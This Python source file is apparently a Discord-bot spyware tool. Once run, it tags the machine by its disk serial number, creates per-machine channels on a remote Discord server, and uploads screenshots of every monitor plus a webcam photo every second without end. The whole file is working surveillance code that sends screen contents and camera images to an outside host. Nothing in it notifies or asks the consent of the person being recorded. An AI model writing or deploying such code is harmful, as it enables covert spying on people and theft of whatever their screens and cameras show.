import discord
import platform
import subprocess
import time
import cv2
from mss import mss, tools
from discord.ext import commands
import os

# Bot token
token = "YOUR TOKEN"
# Server ID
SERVER_ID = 123456789

# Bot intents configuration
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True  # Change this line from message_content to messages

bot = commands.Bot(command_prefix="!", intents=intents)

def get_temp_dir():
    """Returns the path to the temporary folder on Windows."""
    return os.environ.get('TEMP', '/tmp')  # Uses /tmp as the default temporary folder on other OS

def get_disk_id():
    """ Retrieves the hard drive ID on Windows """
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["wmic", "diskdrive", "get", "serialnumber"],
                capture_output=True, text=True
            )
            lines = [line.strip() for line in result.stdout.splitlines() if line.strip()]
            if len(lines) > 1:
                return lines[1]  # Disk ID
        except Exception as e:
            print(f"Error while retrieving the disk ID: {e}")
    return "unknown-disk-id"

async def create_category_and_channels(guild, disk_id, screen_count):
    """ Creates a category and channels based on the number of screens """
    # Create a category with the name of the hard drive
    category = await guild.create_category(f"{disk_id}")
    
    # Create channels based on the number of screens
    screen_channels = []
    for i in range(screen_count):
        screen_channel = await guild.create_text_channel(f"screen-{i+1}", category=category)
        screen_channels.append(screen_channel)
    
    # Create a channel for the camera
    cam_channel = await guild.create_text_channel("cam", category=category)

    return screen_channels, cam_channel

async def find_or_create_channels(guild, disk_id, screen_count):
    """ Checks if a category with the hard drive ID already exists, recreates missing channels if necessary """
    for category in guild.categories:
        if category.name == disk_id:
            print(f"Existing category found: {category.name}")

            # Retrieve current channels in the category
            screen_channels = {channel.name: channel for channel in category.channels if channel.name.startswith("screen")}
            cam_channel = discord.utils.get(category.channels, name="cam")

            # Create a dictionary of missing screen channels
            missing_screens = []
            for i in range(1, screen_count + 1):
                if f"screen-{i}" not in screen_channels:
                    # If a screen-{i} channel is missing, recreate it
                    missing_screens.append(i)

            # If a cam channel is missing, recreate it
            if cam_channel is None:
                print("Cam channel missing, creating...")
                cam_channel = await guild.create_text_channel("cam", category=category)
            
            # Create missing channels
            for i in missing_screens:
                print(f"Creating missing channel screen-{i}")
                new_screen_channel = await guild.create_text_channel(f"screen-{i}", category=category)
                screen_channels[f"screen-{i}"] = new_screen_channel

            # Return channels in order
            return [screen_channels[f"screen-{i}"] for i in range(1, screen_count + 1)], cam_channel

    print("No category found, creating new channels.")
    return await create_category_and_channels(guild, disk_id, screen_count)

async def send_screenshots_and_camera_photos(screen_channels, cam_channel):
    """ Sends screenshots and camera photos to the corresponding channels """
    with mss() as sct:
        while True:
            # Capture screens and send them to the channels
            for i, monitor in enumerate(sct.monitors[1:], start=1):
                screenshot = sct.grab(monitor)
                screenshot_filename = os.path.join(get_temp_dir(), f"monitor_{i}.png")  # Use temporary folder
                tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_filename)

                with open(screenshot_filename, "rb") as f:
                    picture = discord.File(f)
                    await screen_channels[i-1].send(file=picture)

            # Take a photo with the camera
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                camera_filename = os.path.join(get_temp_dir(), "camera_photo.png")  # Use temporary folder
                cv2.imwrite(camera_filename, frame)

                with open(camera_filename, "rb") as f:
                    picture = discord.File(f)
                    await cam_channel.send(file=picture)
            
            cap.release()
            time.sleep(1)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    
    # Retrieve the server
    guild = discord.utils.get(bot.guilds, id=SERVER_ID)
    if guild:
        # Get the disk ID
        disk_id = get_disk_id()
        print(f"Disk ID: {disk_id}")

        # Detect the number of screens
        with mss() as sct:
            screen_count = len(sct.monitors) - 1  # Number of screens (monitors[0] is the main screen)
        print(f"Number of screens detected: {screen_count}")

        # Check or create channels for each screen and the camera
        screen_channels, cam_channel = await find_or_create_channels(guild, disk_id, screen_count)
        
        # Send screenshots and camera captures
        await send_screenshots_and_camera_photos(screen_channels, cam_channel)
    else:
        print(f"Server with ID {SERVER_ID} not found.")

bot.run(token)
